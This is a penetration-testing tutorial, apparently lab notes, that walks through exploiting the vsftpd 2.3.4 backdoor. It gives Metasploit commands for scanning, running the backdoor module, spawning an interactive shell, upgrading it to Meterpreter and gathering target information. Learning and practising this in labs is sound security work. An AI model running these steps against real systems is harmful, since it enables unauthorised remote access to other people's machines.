# Exploiting a Vulnerable FTP Server

## FTP (File Transfer Protocol)

- **FTP**: A protocol used for transferring files between a server and its clients, typically operating on **TCP port 21**.
- **Use Cases**:
  - Facilitating file sharing between systems.
  - Transferring files to and from a web serverâ€™s directory.
- **vsftpd**: A popular FTP server for Unix-like systems, including Linux distributions such as Ubuntu, CentOS, and Fedora. It is the default FTP server for these systems.
- **Vulnerability**: **vsftpd V2.3.4** is vulnerable to a **Remote Command Execution (RCE)** vulnerability caused by a backdoor introduced into the vsftpd archive during a **supply chain attack**.

## Demo: Exploiting FTP

### Plan

We aim to exploit the **vsftpd V2.3.4** vulnerability to gain remote access to the FTP server. After identifying the FTP service and version through scanning, we will use a prebuilt Metasploit exploit module to exploit the backdoor vulnerability. Once we have a shell on the target, we will upgrade it to a **Meterpreter** session for post-exploitation.

### Step-by-Step Process

Start by checking the network interface configuration:

```bash
ifconfig
```

Start the Metasploit console and the PostgreSQL service:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the vsftpd attack:

```bash
workspace -a vsftpd2.3.4
```

Set the target IP globally for all subsequent commands:

```bash
setg rhosts [targetIP]
```

Check the workspace:

```bash
workspace
```

### Scanning and Enumeration

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

Check the services discovered during the scan:

```bash
services
```

Analyze the target system and services further:

```bash
analyze
```

### Exploit vsftpd Vulnerability

Search for the **vsftpd** exploit module in Metasploit:

```bash
search vsftpd
```

Use the **vsftpd 2.3.4 backdoor exploit** module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Show the available options and module information:

```bash
show options
```

Run the exploit to gain a shell:

```bash
run
```

Once we have a basic shell, upgrade to an interactive bash shell:

```bash
/bin/bash -i
```

### Upgrading to Meterpreter

Background the current shell session by pressing **CTRL + Z**.

Search for a module to upgrade the shell to a Meterpreter session:

```bash
search shell_to_meterpreter
```

Use the **shell_to_meterpreter** post-exploitation module:

```bash
use post/multi/manage/shell_to_meterpreter
```

Set the local host interface (replace `eth1` with the correct interface):

```bash
set lhost eth1
```

Set the current shell session (assuming the shell session ID is `1`):

```bash
set session 1
```

Run the module to upgrade the shell:

```bash
run
```

### Post-Exploitation

List all active sessions:

```bash
sessions
```

Select the Meterpreter session (replace `2` with the actual session ID):

```bash
sessions 2
```

Check the system information on the target:

```bash
sysinfo
```

Verify the user ID on the target system:

```bash
getuid
```

### Conclusion

What we accomplished:
- Exploited the **vsftpd 2.3.4** backdoor vulnerability.
- Obtained an initial shell on the target system.
- Upgraded the shell to a **Meterpreter session**.
- Performed post-exploitation steps to gather system information.
